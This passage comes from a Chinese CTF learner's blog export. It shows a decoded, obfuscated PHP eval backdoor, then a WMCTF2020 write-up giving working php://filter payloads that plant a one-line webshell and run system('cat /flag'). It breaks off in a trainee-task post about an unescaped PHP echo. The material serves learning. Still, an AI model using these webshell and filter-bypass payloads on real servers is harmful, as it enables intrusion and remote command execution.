class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">91</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">11</span>, <span class="hljs-number">79</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">42</span>, <span class="hljs-number">23</span>, <span class="hljs-number">88</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">35</span>, <span class="hljs-number">68</span>, <span class="hljs-number">38</span>, <span class="hljs-number">63</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">30</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">23</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>, <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">40</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">49</span>, <span class="hljs-number">51</span>, <span class="hljs-number">4</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">70</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">21</span>, <span class="hljs-number">47</span>, <span class="hljs-number">93</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">58</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">47</span>);<br><span class="hljs-variable">$do_me</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$order</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$do_me</span>=<span class="hljs-variable">$do_me</span>.<span class="hljs-variable">$terms</span>[<span class="hljs-variable">$order</span>[<span class="hljs-variable">$i</span>]];<br>&#125;<br><span class="hljs-comment">#   echo($do_me);</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$do_me</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾ä¸€ä¸‹do_meã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>= \<span class="hljs-string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span><br><span class="hljs-string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span><br><span class="hljs-string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span><br><span class="hljs-string">eval($___($__));</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>base64è§£ç ä¸€ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\84\x66\x6C\x61\x72\x65\x44\65\x53\72\111\110\x44\79\84\99\x6F\x6D&quot;</span>]))<br>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;</span>]));<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ²¡æœ‰å»å†™è„šæœ¬äº†ã€‚\ åé¢è·Ÿåè¿›åˆ¶æ•°ï¼Œ\x åé¢è·Ÿåå…­è¿›åˆ¶æ•°ã€‚ç½‘ç«™ç›´æ¥16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 16è¿›åˆ¶">\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\x54\x66\x6C\x61\x72\x65\x44\x41\x53\x48\x6f\x6e\x44\x4f\x54\x63\x6F\x6D<br><br>a11DOTthatDOTjava5crapATflareDASHonDOTcom<br></code></pre></td></tr></table></figure><p>åç»­æ˜¯çœ‹äº†wpçš„ã€‚</p><p><strong>æŒ‰ç…§ flareon æ¯”èµ› flag çš„å°¿æ€§ï¼ŒDOT è¦æ¢æˆ .ï¼ŒAT æ¢æˆ @ï¼ŒDASH æ¢æˆ -ï¼Œå¾—åˆ°æœ€ç»ˆçš„ flag</strong><br>æœ€ç»ˆ<a href="mailto:&#x61;&#x31;&#x31;&#x2e;&#116;&#x68;&#97;&#x74;&#x2e;&#106;&#x61;&#x76;&#x61;&#53;&#x63;&#x72;&#97;&#x70;&#x40;&#x66;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#x6e;&#46;&#x63;&#x6f;&#109;">&#x61;&#x31;&#x31;&#x2e;&#116;&#x68;&#97;&#x74;&#x2e;&#106;&#x61;&#x76;&#x61;&#53;&#x63;&#x72;&#97;&#x70;&#x40;&#x66;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#x6e;&#46;&#x63;&#x6f;&#109;</a>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183842.png"></p><h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><p>è¿›å»ä¸€çœ‹ä»£ç  æ„Ÿè§‰è¯»æ‡‚äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215113647.png" alt="QQæˆªå›¾20220215113647"></p><p>æ´‹æ´‹å¾—æ„ç›´æ¥æ„é€ é“¾æ¥â€”&gt;<a href="http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php">http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php</a><br>å¾ˆæ‰“è„¸ã€‚<br>ç„¶åå†ä»”ç»†è¯»äº†è¯»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸æ˜¯ç›´æ¥å°±é€€å‡ºäº†å˜›ã€‚ç½‘ä¸Šç¿»é˜…å¾ˆä¹…èµ„æ–™åç»­çœ‹åˆ°pç¥çš„æ–‡ç« ã€‚<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h3 id="ç»•è¿‡-lt-php-exit-gt"><a href="#ç»•è¿‡-lt-php-exit-gt" class="headerlink" title="ç»•è¿‡&lt;?php exit();&gt;"></a>ç»•è¿‡&lt;?php exit();&gt;</h3><p><a href="https://bbs.pediy.com/thread-271283.htm%E8%BF%99%E6%98%AFh3%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E5%BB%BA%E8%AE%AE%E8%AF%A6%E8%AF%BB%E3%80%82">https://bbs.pediy.com/thread-271283.htmè¿™æ˜¯h3å¸ˆå‚…çš„æ–‡ç« ï¼Œå»ºè®®è¯¦è¯»ã€‚</a></p><h3 id="å·§ç”¨base64ç¼–ç "><a href="#å·§ç”¨base64ç¼–ç " class="headerlink" title="å·§ç”¨base64ç¼–ç "></a>å·§ç”¨base64ç¼–ç </h3><p>pç¥æ–‡ç« è®²çš„å¾ˆæ¸…æ¥šã€‚<br>è‡ªå·±ä¸å¾ˆæ¸…æ¥šç‚¹çš„ã€‚</p><ul><li>&#96;&#96;&#96;php<br>$content .&#x3D; $_POST[â€˜txtâ€™];  #è¿™é‡Œçš„ç‚¹æ˜¯è¿æ¥çš„æ„æ€ï¼Œå“ˆå“ˆå“ˆå°ç™½éå¸¸èœ ä»”ç»†è¯»pç¥çš„æ–‡ç« åŠä»–çš„å›¾ç‰‡+åŠçŒœåŠè’™<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- base64è§£ç æ–¹å¼ï¼šâ€œphpexitâ€ä¸€å…±<span class="hljs-number">7</span>ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯<span class="hljs-number">4</span>ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ <span class="hljs-number">1</span>ä¸ªâ€œaâ€ä¸€å…±<span class="hljs-number">8</span>ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œ<span class="hljs-string">&quot;phpexita&quot;</span>è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯`<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>; <span class="hljs-meta">?&gt;</span>`æ²¡æœ‰äº†ã€‚<br><br>- ```php<br>  <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>])<br>  <span class="hljs-comment">#åŒ¹é…å­—ç¬¦ æ›¿æ¢æˆçš„å­—ç¬¦ æ›¿æ¢ç›®æ ‡</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ"><a href="#å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ" class="headerlink" title="å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ"></a>å·§ç”¨å­—ç¬¦ä¸²æ“ä½œ</h3><ul><li><pre><code class="php">&lt;?php exit; ?&gt; # å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```php<br>  strip_tags() # â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°<br></code></pre></td></tr></table></figure></code></pre></li><li><p>php:&#x2F;&#x2F;filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†webshellç”¨base64ç¼–ç ã€‚åœ¨è°ƒç”¨å®Œæˆstrip_tagsåå†è¿›è¡Œbase64-decodeã€‚â€œæ­»äº¡exitâ€åœ¨ç¬¬ä¸€æ­¥è¢«å»é™¤ï¼Œè€Œwebshellåœ¨ç¬¬äºŒæ­¥è¢«è¿˜åŸã€‚</p></li><li><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨rot13ç¼–ç ç‹¬ç«‹å®Œæˆä»»åŠ¡ã€‚åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€œæ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œåœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†ã€‚</p></li></ul><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>rot3åŠ å¯†ï¼š<a href="http://www.hiencode.com/rot13.html">http://www.hiencode.com/rot13.html</a><br>require_once:<a href="https://www.php.net/manual/zh/function.require-once.php">https://www.php.net/manual/zh/function.require-once.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">#rot3ç¼–ç </span><br>cuc @<span class="hljs-title function_ invoke__">riny</span>(<span class="hljs-variable">$_cbfg</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);<br><br>php:<span class="hljs-comment">//filter/write=string.%7%32ot13|cuc @riny($_cbfg[&#x27;pzq&#x27;]);|/resource=shell.php </span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144143.png" alt="QQæˆªå›¾20220215144143"></p><p>è¿™é‡Œå°±å¯¼è‡´ä¸èƒ½ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¯¼è‡´æ¯æ¬¡éƒ½è¦é‡å†™æ–‡ä»¶ã€‚(æ¥è‡ª<strong>H3h3QAQ</strong>)å¸ˆå‚…çš„è§£ç­”ã€‚</p><h3 id="è¿‡æ»¤å™¨ç»•è¿‡"><a href="#è¿‡æ»¤å™¨ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡"></a>è¿‡æ»¤å™¨ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">?<br>content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);  <br><br>?content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>); <br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥é‡‡ç”¨h3å¸ˆå‚…çš„ç»•è¿‡ã€‚å“ˆå“ˆå“ˆã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215145358.png" alt="QQæˆªå›¾20220215145358"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144737.png" alt="QQæˆªå›¾20220215144737"></p><p>å¸®å©†å©†æ‹–åœ°å»äº†ï¼Œæ˜å¤©å°±è¦èµ°äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepnepè§ä¹ é˜Ÿå‘˜ä»»åŠ¡ï¼ˆä¸å®Œæ•´ï¼‰</title>
    <link href="/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"/>
    <url>/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepnepè§ä¹ é˜Ÿå‘˜"><a href="#Nepnepè§ä¹ é˜Ÿå‘˜" class="headerlink" title="Nepnepè§ä¹ é˜Ÿå‘˜"></a>Nepnepè§ä¹ é˜Ÿå‘˜</h1><h2 id="åˆå­¦-è§†é¢‘1"><a href="#åˆå­¦-è§†é¢‘1" class="headerlink" title="åˆå­¦-è§†é¢‘1"></a>åˆå­¦-è§†é¢‘1</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222652.png" alt="QQæˆªå›¾20220217222652"></p><p>å»youtubeä¸Šæ‰¾äº†ç¿»è¯‘å˜¿å˜¿ã€‚<a href="https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj">https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj</a> ï¼ˆå­—å¹•è‡ªå¸¦ç¿»è¯‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222851.png" alt="QQæˆªå›¾20220217222851"></p><p>è¿™é‡Œå°±å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.æœ¬è§†é¢‘ä¸€å¼€å§‹ä»‹ç»äº†å“ªä¸¤ä¸ªå·¥å…·ï¼Œä»–ä»¬çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä½œè€…ä¼šæ¨èfirefoxï¼Œå®ƒçš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ<span class="hljs-number">5</span>åˆ†ï¼‰<br><br><span class="hljs-attribute">bp</span>ï¼ˆæŠ“åŒ…ï¼‰ å’Œ firefoxï¼ˆè®¾ç½®ä»£ç†æ–¹ä¾¿ï¼‰<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.æœ¬è§†é¢‘ä¸­ä½“ç°äº†å“ªäº›æ”»é˜²ä¸Šçš„å“²å­¦è§‚ç‚¹ï¼Ÿä½œè€…å¸Œæœ›ä½ å…»æˆä»€ä¹ˆæ ·çš„æ€ç»´ï¼Ÿè¿™äº›æ€ç»´åœ¨å¸®åŠ©ä½ æŒ–æ˜æ¼æ´çš„æ—¶å€™æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Ÿç»“åˆä½ çš„ç»å†ä¸è§†é¢‘å†…å®¹è°ˆè°ˆä½ çš„çœ‹æ³•ã€‚ï¼ˆ10åˆ†ï¼‰<br><br>ä½“ä¼šå¤ªå¤šå•¦~~<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if(isset($_GET[ &#x27; name &#x27; ]))&#123;<br>echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#x27;name&#x27;]&#125; !&lt;/h1&gt;&quot;;<br>&#125;<br>?&gt;<br>å¦‚æœgetæ–¹æ³•å­˜åœ¨nameå˜é‡å£°æ˜ï¼Œåˆ™è¾“å‡ºnameçš„å€¼ã€‚<br>&lt;form method=&quot;GET&quot;&gt;<br>Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;<br>&lt;input type=&quot; submit&quot;&gt;<br>é‚£ä¹ˆï¼Œä»¥ä¸Šä»£ç 